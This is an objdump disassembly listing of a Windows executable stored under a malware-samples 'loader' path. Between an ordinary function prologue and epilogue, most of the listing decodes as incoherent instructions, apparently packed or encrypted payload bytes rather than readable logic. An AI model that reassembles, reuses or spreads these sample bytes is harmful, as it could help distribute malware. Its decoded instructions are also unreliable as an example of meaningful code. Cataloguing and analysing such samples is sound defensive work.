
malware_samples/loader/0bdaf57008155d86386be211659052e0a86f2108abf2d3368b3693bc256e2e30.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 30             	sub    $0x30,%esp
  401006:	57                   	push   %edi
  401007:	56                   	push   %esi
  401008:	53                   	push   %ebx
  401009:	9f                   	lahf
  40100a:	76 ae                	jbe    0x400fba
  40100c:	31 eb                	xor    %ebp,%ebx
  40100e:	02 7c c0 b3          	add    -0x4d(%eax,%eax,8),%bh
  401012:	bc 11 77 dd 28       	mov    $0x28dd7711,%esp
  401017:	8e bd 3c d0 f1 6e    	mov    0x6ef1d03c(%ebp),%?
  40101d:	3c 14                	cmp    $0x14,%al
  40101f:	ec                   	in     (%dx),%al
  401020:	27                   	daa
  401021:	41                   	inc    %ecx
  401022:	17                   	pop    %ss
  401023:	cd 8a                	int    $0x8a
  401025:	7d 41                	jge    0x401068
  401027:	f7 50 7e             	notl   0x7e(%eax)
  40102a:	00 d0                	add    %dl,%al
  40102c:	cb                   	lret
  40102d:	16                   	push   %ss
  40102e:	26 78 8e             	es js  0x400fbf
  401031:	53                   	push   %ebx
  401032:	95                   	xchg   %eax,%ebp
  401033:	b4 73                	mov    $0x73,%ah
  401035:	6f                   	outsl  %ds:(%esi),(%dx)
  401036:	85 92 bb 44 86 d9    	test   %edx,-0x2679bb45(%edx)
  40103c:	86 2d eb 2e 8c e1    	xchg   %ch,0xe18c2eeb
  401042:	44                   	inc    %esp
  401043:	f8                   	clc
  401044:	75 99                	jne    0x400fdf
  401046:	66 1c ac             	data16 sbb $0xac,%al
  401049:	2b 29                	sub    (%ecx),%ebp
  40104b:	0d e5 0c ec 1b       	or     $0x1bec0ce5,%eax
  401050:	31 31                	xor    %esi,(%ecx)
  401052:	93                   	xchg   %eax,%ebx
  401053:	e8 9f 4e 68 5e       	call   0x5ea85ef7
  401058:	ca 1b 0b             	lret   $0xb1b
  40105b:	65 5b                	gs pop %ebx
  40105d:	11 6b 51             	adc    %ebp,0x51(%ebx)
  401060:	dd ee                	fucomp %st(6)
  401062:	01 81 28 36 64 c8    	add    %eax,-0x379bc9d8(%ecx)
  401068:	af                   	scas   %es:(%edi),%eax
  401069:	58                   	pop    %eax
  40106a:	40                   	inc    %eax
  40106b:	0e                   	push   %cs
  40106c:	fc                   	cld
  40106d:	cb                   	lret
  40106e:	66 8e 25 6f 1f 91 56 	data16 mov 0x56911f6f,%fs
  401075:	2e fe 09             	decb   %cs:(%ecx)
  401078:	eb 60                	jmp    0x4010da
  40107a:	b8 db a4 fd 48       	mov    $0x48fda4db,%eax
  40107f:	2e 00 a4 9f 92 b7 9a 	add    %ah,%cs:0x319ab792(%edi,%ebx,4)
  401086:	31 
  401087:	0d 17 4f 73 5d       	or     $0x5d734f17,%eax
  40108c:	6d                   	insl   (%dx),%es:(%edi)
  40108d:	6f                   	outsl  %ds:(%esi),(%dx)
  40108e:	8f c0                	pop    %eax
  401090:	4d                   	dec    %ebp
  401091:	bd 26 96 95 98       	mov    $0x98959626,%ebp
  401096:	e7 62                	out    %eax,$0x62
  401098:	bc 13 55 ff aa       	mov    $0xaaff5513,%esp
  40109d:	21 a9 9e 21 35 c5    	and    %ebp,-0x3acade62(%ecx)
  4010a3:	8a 2b                	mov    (%ebx),%ch
  4010a5:	69 f5 ba 1f b9 c6    	imul   $0xc6b91fba,%ebp,%esi
  4010ab:	53                   	push   %ebx
  4010ac:	f7 fe                	idiv   %esi
  4010ae:	03 87 fc 69 79 e1    	add    -0x1e869604(%edi),%eax
  4010b4:	08 d8                	or     %bl,%al
  4010b6:	89 66 54             	mov    %esp,0x54(%esi)
  4010b9:	28 4a d6             	sub    %cl,-0x2a(%edx)
  4010bc:	f7 96 b1 26 0c 9e    	notl   -0x61f3d94f(%esi)
  4010c2:	4f                   	dec    %edi
  4010c3:	7d f7                	jge    0x4010bc
  4010c5:	d4 89                	aam    $0x89
  4010c7:	e8 e3 a4 c3 3e       	call   0x3f03b5af
  4010cc:	9c                   	pushf
  4010cd:	79 07                	jns    0x4010d6
  4010cf:	3f                   	aas
  4010d0:	af                   	scas   %es:(%edi),%eax
  4010d1:	36 98                	ss cwtl
  4010d3:	91                   	xchg   %eax,%ecx
  4010d4:	0a d0                	or     %al,%dl
  4010d6:	79 9b                	jns    0x401073
  4010d8:	c2 13 5f             	ret    $0x5f13
  4010db:	c1 30 06             	shll   $0x6,(%eax)
  4010de:	9c                   	pushf
  4010df:	71 7d                	jno    0x40115e
  4010e1:	79 6b                	jns    0x40114e
  4010e3:	bb 64 5b 5e 5f       	mov    $0x5f5e5b64,%ebx
  4010e8:	83 c4 30             	add    $0x30,%esp
  4010eb:	5d                   	pop    %ebp
  4010ec:	c3                   	ret
  4010ed:	d1 30                	shll   $1,(%eax)
  4010ef:	fc                   	cld
  4010f0:	3d f9 2e e8 4d       	cmp    $0x4de82ef9,%eax
  4010f5:	71 1d                	jno    0x401114
  4010f7:	4d                   	dec    %ebp
  4010f8:	93                   	xchg   %eax,%ebx
  4010f9:	2a 16                	sub    (%esi),%dl
  4010fb:	5a                   	pop    %edx
  4010fc:	d2 33                	shlb   %cl,(%ebx)
  4010fe:	19 b7 7c b4 87 12    	sbb    %esi,0x1287b47c(%edi)
  401104:	d2 e7                	shl    %cl,%bh
  401106:	2a 3e                	sub    (%esi),%bh
  401108:	d0 47 6d             	rolb   $1,0x6d(%edi)
  40110b:	a1 40 9a 81 f8       	mov    0xf8819a40,%eax
  401110:	e9 c0 ad 3e 44       	jmp    0x447ebed5
  401115:	ca 51 0d             	lret   $0xd51
  401118:	01 71 b7             	add    %esi,-0x49(%ecx)
  40111b:	86 83 ce 81 a6 c3    	xchg   %al,-0x3c597e32(%ebx)
  401121:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401122:	43                   	inc    %ebx
  401123:	2d 0d 67 b5 1c       	sub    $0x1cb5670d,%eax
  401128:	84 90 90 90 90 90    	test   %dl,-0x6f6f6f70(%eax)
  40112e:	90                   	nop
  40112f:	90                   	nop
  401130:	90                   	nop
  401131:	90                   	nop
  401132:	90                   	nop
  401133:	cc                   	int3
  401134:	cc                   	int3
  401135:	cc                   	int3
  401136:	cc                   	int3
	...
